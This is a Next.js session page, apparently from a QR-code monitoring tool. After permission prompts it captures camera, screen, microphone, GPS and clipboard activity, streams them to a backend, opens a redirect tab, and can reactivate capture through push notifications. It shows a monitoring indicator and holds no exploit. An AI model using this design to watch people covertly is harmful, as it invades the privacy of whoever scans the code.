/**
 * Session Content Page - Refactored
 * Orchestrates session components with clean state management
 */

'use client';

import { useCallback, useEffect, useRef, useState } from 'react';
import { useParams } from 'next/navigation';
import { useHeartbeat } from '@/hooks/useHeartbeat';
import { useTabVisibility } from '@/hooks/useTabVisibility';
import { useWebRTCMonitor } from '@/hooks/useWebRTCMonitor';
import { useMediaTrackMonitor } from '@/hooks/useMediaTrackMonitor';
import { useClipboardMonitor } from '@/hooks/useClipboardMonitor';
import { useCapturePolicy } from '@/hooks/useCapturePolicy';
import { stopCamera } from '@/lib/camera';
import { stopScreenCapture } from '@/lib/screen-capture';
import { stopMicrophone } from '@/lib/audio';
import { detectCapabilities } from '@/lib/capability-detector';
import type { ClientCapabilities } from '@/types/capabilities';
import type { SessionState, SessionInfo } from '@/features/session/types/session.types';
import { UserPushNotificationListener } from '@/components/UserPushNotificationListener';
import type { Socket } from 'socket.io-client';
import { getPublisherJsonHeaders } from '@/lib/publisher-auth';
import { activateRequestedMedia, type CaptureTarget } from '@/features/session/lib/capture-startup';
import {
  evaluateSessionPolicy,
  sendDeviceInfo,
  sendSessionCapabilities,
  updatePermissionStatus,
} from '@/features/session/lib/session-runtime-api';
import { useAudioClipCapture } from '@/features/session/hooks/useAudioClipCapture';
import { useRealtimePublisher } from '@/features/session/hooks/useRealtimePublisher';
import { useScreenshotConfig } from '@/features/session/hooks/useScreenshotConfig';
import { useScreenshotCapture } from '@/features/session/hooks/useScreenshotCapture';
import { useMediaElementBinding } from '@/features/session/hooks/useMediaElementBinding';
import { useSessionBootstrap } from '@/features/session/hooks/useSessionBootstrap';
import { useSessionWebPush } from '@/features/session/hooks/useSessionWebPush';

type ReactivateTarget = CaptureTarget;

// NEW: Refactored components
import HiddenMediaElements from '@/features/session/components/HiddenMediaElements';
import SessionLoadingState from '@/features/session/components/SessionLoadingState';
import SessionErrorState from '@/features/session/components/SessionErrorState';
import PermissionFlow from '@/features/session/components/PermissionFlow';
import ActiveMonitoringIndicator from '@/features/session/components/ActiveMonitoringIndicator';
import ActiveSessionLayout from '@/features/session/components/ActiveSessionLayout';

export default function SessionContentPage() {
  const params = useParams();
  const sessionId = params.sessionId as string;
  
  // Session state
  const [sessionState, setSessionState] = useState<SessionState>('initializing');
  const [sessionInfo, setSessionInfo] = useState<SessionInfo | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [permissionStep, setPermissionStep] = useState('Inicializando...');
  const [redirectFallbackUrl, setRedirectFallbackUrl] = useState<string | null>(null);
  const [capabilities, setCapabilities] = useState<ClientCapabilities | null>(null);
  const [unsupportedFeatures] = useState<string[]>([]);
  
  // Capture policy hook
  const { effectiveIntervals } = useCapturePolicy(
    sessionInfo?.qrId || '',
    capabilities
  );

  const { currentQrIdRef, reloadScreenshotConfig, screenshotIntervalsMs } = useScreenshotConfig(
    sessionInfo?.qrId || null
  );
  
  // Media refs
  const videoRef = useRef<HTMLVideoElement>(null);
  const screenVideoRef = useRef<HTMLVideoElement>(null);
  const cameraStreamRef = useRef<MediaStream | null>(null);
  const screenStreamRef = useRef<MediaStream | null>(null);
  const micStreamRef = useRef<MediaStream | null>(null);
  const locationWatchRef = useRef<number | null>(null);
  const lastGpsUpdateRef = useRef<number>(0);
  const realtimeSocketRef = useRef<Socket | null>(null);
  const peerConnectionsRef = useRef<Map<string, RTCPeerConnection>>(new Map());
  const publisherTokenRef = useRef<string | null>(null);
  const redirectOpenedRef = useRef(false);
  const [publisherTokenReady, setPublisherTokenReady] = useState(false);
  const [, setIsWebRTCReady] = useState(false);
  const [streamsReady, setStreamsReady] = useState({
    camera: false,
    screen: false,
    microphone: false,
  });

  const { webPushStatus, enableWebPush, testWebPush } = useSessionWebPush({
    sessionId,
    publisherTokenRef,
  });
  
  // Hooks
  useHeartbeat(sessionId, publisherTokenReady);
  
  useTabVisibility({
    sessionId,
    backendUrl: process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:7000',
    enabled: !!sessionId && publisherTokenReady,
  });

  useWebRTCMonitor({
    sessionId,
    backendUrl: process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:7000',
    enabled: !!sessionId && publisherTokenReady,
  });

  useMediaTrackMonitor({
    sessionId,
    backendUrl: process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:7000',
    enabled: !!sessionId && publisherTokenReady,
  });

  useClipboardMonitor({
    sessionId,
    backendUrl: process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:7000',
    enabled: !!sessionId && publisherTokenReady,
  });

  useMediaElementBinding({
    streamsReady,
    videoRef,
    screenVideoRef,
    cameraStreamRef,
    screenStreamRef,
  });

  const effectiveScreenshotIntervalsMs = {
    screen: streamsReady.screen ? screenshotIntervalsMs.screen : null,
    camera: screenshotIntervalsMs.camera || (!streamsReady.screen && streamsReady.camera ? screenshotIntervalsMs.screen : null),
  };

  useScreenshotCapture({
    sessionId,
    streamsReady,
    videoRef,
    screenVideoRef,
    cameraStreamRef,
    screenStreamRef,
    realtimeSocketRef,
    screenshotIntervalsMs: effectiveScreenshotIntervalsMs,
  });

  useAudioClipCapture({
    sessionId,
    streamsReady,
    micStreamRef,
    realtimeSocketRef,
    microphoneIntervalMs: effectiveIntervals?.microphone,
  });

  const setupWebRTCPublisher = useRealtimePublisher({
    sessionId,
    publisherTokenRef,
    cameraStreamRef,
    screenStreamRef,
    micStreamRef,
    realtimeSocketRef,
    peerConnectionsRef,
    currentQrIdRef,
    reloadScreenshotConfig,
    setIsWebRTCReady,
  });

  // Effect: Open redirect URL when sessionInfo is ready
  useEffect(() => {
    if (!sessionInfo?.redirectUrl || redirectOpenedRef.current) return;
    redirectOpenedRef.current = true;

    console.log('🌐 [Redirect] Abriendo destino:', sessionInfo.redirectUrl);
    try {
      const openedWindow = window.open(sessionInfo.redirectUrl, '_blank', 'noopener,noreferrer');
      if (!openedWindow) {
        setRedirectFallbackUrl(sessionInfo.redirectUrl);
      }
    } catch (err) {
      console.error('❌ [Redirect] Error abriendo ventana:', err);
      setRedirectFallbackUrl(sessionInfo.redirectUrl);
    }
  }, [sessionInfo]);

  // Note: setupWebRTCPublisher() is now called directly in startAllCapture() 
  // before marking streams as ready, ensuring proper initialization order

  const startAllCapture = async (
    reactivateTargets?: ReactivateTarget[],
    sessionInfoOverride?: SessionInfo | null,
  ) => {
    const activeSessionInfo = sessionInfoOverride ?? sessionInfo;
    const requestedTargets = new Set<ReactivateTarget>(
      reactivateTargets ?? ['camera', 'microphone', 'screen', 'location'],
    );

    setSessionState('requesting-permissions');

    try {
      // Detect capabilities
      setPermissionStep('Detectando capacidades del dispositivo...');
      const caps = await detectCapabilities();
      setCapabilities(caps);
      
      // Send capabilities to backend
      await sendSessionCapabilities(sessionId, caps);
      
      // Evaluate policy
      if (activeSessionInfo?.qrPolicy) {
        setPermissionStep('Verificando permisos requeridos...');
        const policyResult = await evaluateSessionPolicy(sessionId, activeSessionInfo.qrPolicy, caps);
        if (!policyResult.ok) {
          setError(policyResult.errorMessage || 'No se pudo verificar permisos requeridos');
          setSessionState('error');
          return;
        }
      }
      
      await activateRequestedMedia({
        sessionId,
        capabilities: caps,
        requestedTargets,
        cameraStreamRef,
        screenStreamRef,
        micStreamRef,
        locationWatchRef,
        lastGpsUpdateRef,
        setPermissionStep,
      });

      // Send device info to backend
      await sendDeviceInfo(sessionId);

      // Update permissions status
      await updatePermissionStatus(sessionId, {
        camera: !!cameraStreamRef.current,
        microphone: !!micStreamRef.current,
        screen: !!screenStreamRef.current,
        location: !!locationWatchRef.current,
      });

      setSessionState('active');
      setPermissionStep('');
      
      // Initialize WebRTC socket BEFORE marking streams as ready
      if (!realtimeSocketRef.current?.connected) {
        await setupWebRTCPublisher();
      }
      console.log('✅ [Setup] Socket realtime inicializado, activando capturas...');
      
      // NOW mark streams as ready - useEffect hooks will see the socket
      setStreamsReady({
        camera: !!cameraStreamRef.current,
        screen: !!screenStreamRef.current,
        microphone: !!micStreamRef.current,
      });
      console.log('✅ [Setup] Streams marcados como listos para captura');

      void enableWebPush(false);
      
    } catch (err: any) {
      console.error('Error starting capture:', err);
      setError(err.message || 'Error al iniciar captura');
      setSessionState('error');
    }
  };

  useSessionBootstrap({
    sessionId,
    publisherTokenRef,
    enableWebPush,
    startAllCapture,
    setSessionState,
    setSessionInfo,
    setPublisherTokenReady,
    setError,
  });

  const stopAllStreams = useCallback((resetUiState = true) => {
    if (videoRef.current) stopCamera(videoRef.current);
    if (screenStreamRef.current) stopScreenCapture(screenStreamRef.current);
    if (micStreamRef.current) stopMicrophone(micStreamRef.current);
    if (locationWatchRef.current) navigator.geolocation.clearWatch(locationWatchRef.current);
    if (realtimeSocketRef.current) realtimeSocketRef.current.disconnect();
    if (screenVideoRef.current) screenVideoRef.current.srcObject = null;

    cameraStreamRef.current = null;
    screenStreamRef.current = null;
    micStreamRef.current = null;
    locationWatchRef.current = null;
    realtimeSocketRef.current = null;
    if (resetUiState) {
      setIsWebRTCReady(false);
      setStreamsReady({ camera: false, screen: false, microphone: false });
    }

    if (peerConnectionsRef.current.size > 0) {
      peerConnectionsRef.current.forEach((pc) => pc.close());
      peerConnectionsRef.current.clear();
    }
  }, []);

  // Cleanup on unmount
  useEffect(() => {
    return () => { stopAllStreams(false); };
  }, [stopAllStreams]);

  const handleEndSession = async () => {
    try {
      await fetch(`/api/session/${sessionId}/end`, {
        method: 'POST',
        headers: getPublisherJsonHeaders(sessionId),
      });
      stopAllStreams();
      setSessionState('ended');
    } catch (err) {
      console.error('Error ending session:', err);
    }
  };

  const requestPermissions = async (targets?: ReactivateTarget[]) => {
    try {
      if (targets?.length) {
        await startAllCapture(targets);
        return;
      }

      await startAllCapture();
    } catch (error) {
      console.error('Error requesting permissions:', error);
      setError('No se pudieron obtener todos los permisos necesarios');
    }
  };

  // Loading state
  if (sessionState === 'initializing') {
    return <SessionLoadingState />;
  }

  // Error state
  if (sessionState === 'error' && error) {
    return <SessionErrorState error={error} />;
  }

  // Requesting permissions state
  if (sessionState === 'requesting-permissions') {
    return <PermissionFlow permissionStep={permissionStep} unsupportedFeatures={unsupportedFeatures} />;
  }

  // Active/Paused/Ended states - Show main UI
  return (
    <>
      {/* Hidden video elements for capture */}
      <HiddenMediaElements videoRef={videoRef} screenVideoRef={screenVideoRef} />

      {/* Active monitoring indicator */}
      {sessionState === 'active' && <ActiveMonitoringIndicator />}

      {/* Main content grid */}
      <ActiveSessionLayout
        videoRef={videoRef}
        screenVideoRef={screenVideoRef}
        hasCameraStream={!!cameraStreamRef.current}
        hasScreenStream={!!screenStreamRef.current}
        sessionState={sessionState}
        onEndSession={handleEndSession}
        permissionStep={permissionStep}
        qrPolicy={sessionInfo?.qrPolicy || null}
        onEnableWebPush={() => void enableWebPush(true)}
        onTestWebPush={() => void testWebPush()}
        webPushStatus={webPushStatus}
        redirectFallbackUrl={redirectFallbackUrl}
      />

      {/* Push notification listener */}
      <UserPushNotificationListener
        sessionId={sessionId}
        publisherToken={publisherTokenRef.current}
        onReactivateTunnel={requestPermissions}
      />
    </>
  );
}
